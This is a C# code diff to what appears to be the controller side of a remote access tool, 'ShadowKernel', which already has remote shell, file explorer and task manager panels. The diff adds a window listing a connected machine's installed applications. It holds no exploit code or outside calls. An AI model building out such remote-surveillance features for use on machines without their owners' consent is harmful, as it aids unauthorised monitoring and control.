@@ -34,6 +34,7 @@ namespace ShadowKernel.userControls
         private CompInfo CI = new CompInfo();
         private TaskManager TM = new TaskManager();
         private ActivePorts AP = new ActivePorts();
+        private AppsInstalled AI = new AppsInstalled();
         private HardwareUsage HUV = new HardwareUsage();
         private FileExplorer FE = new FileExplorer();
         private RemoteShell RS = new RemoteShell();
@@ -321,6 +322,10 @@ namespace ShadowKernel.userControls
 
                 case 22: //Acive Ports Type
                     UpdateActivePortsListbox(ConnectionId, Encoding.UTF8.GetString(ToProcess));
+                    break;
+
+                case 23: //Apps Installed Type
+                    UpdateAppsInstalledListbox(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                     break;
             }
         }
@@ -790,6 +795,65 @@ namespace ShadowKernel.userControls
                 }
                 AP.clientProcesses.ItemsSource = p;
                 AP.clientProcesses.Items.Refresh();
+            }
+        }
+
+
+
+
+        public struct instApp
+        {
+            public string DisplayName { get; set; }
+            public string Publisher { get; set; }
+            public string InstalledDate { get; set; }
+        }
+
+
+        /// <summary>
+        /// Updates apps installed list
+        /// </summary>
+        /// <param name="ConnectionId"></param>
+        /// <param name="Processes"></param>
+        public void UpdateAppsInstalledListbox(int ConnectionId, string Processes)
+        {
+
+            string[] AppsArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
+            string[] AppsArray = AppsArrayRaw.Skip(1).ToArray();
+            List<string> AppsList = new List<string>(AppsArray);
+            AppsList.AddRange(AppsArray);
+            foreach (AppsInstalled AI in System.Windows.Application.Current.Windows.OfType<AppsInstalled>())
+                if (AI.Visibility == Visibility.Visible && AI.ConnectionID == ConnectionId && AI.Update)
+                {
+                    instApp[] p = new instApp[AppsArray.Length - 1];
+                    AI.clientApps.ItemsSource = null;
+                    for (int i = 0; i < AppsArray.Length - 1; i++)
+                    {
+                        p[i].DisplayName = GetSubstringByString("p1", "}", AppsArray[i]);
+                        p[i].Publisher = GetSubstringByString("p2", "{", AppsArray[i]);
+                        p[i].InstalledDate = GetSubstringByString("p3", ";", AppsArray[i]);
+                    }
+                    AI.clientApps.ItemsSource = p;
+                    AI.clientApps.Items.Refresh();
+
+                    return;
+                }
+
+            AI = new AppsInstalled();
+            AI.Show();
+            AI.ConnectionID = ConnectionId;
+            AI.Title = "Установленные приложения - " + AI.ConnectionID;
+            if (AI.ConnectionID == ConnectionId)
+            {
+                instApp[] p = new instApp[AppsArray.Length - 1];
+                AI.clientApps.ItemsSource = null;
+                for (int i = 0; i < AppsArray.Length - 1; i++)
+                {
+                    p[i].DisplayName = GetSubstringByString("p1", "}", AppsArray[i]);
+                    p[i].Publisher = GetSubstringByString("p2", "{", AppsArray[i]);
+                    p[i].InstalledDate = GetSubstringByString("p3", ";", AppsArray[i]);
+                }
+                AI.clientApps.ItemsSource = p;
+                AI.clientApps.Items.Refresh();
             }
         }
 
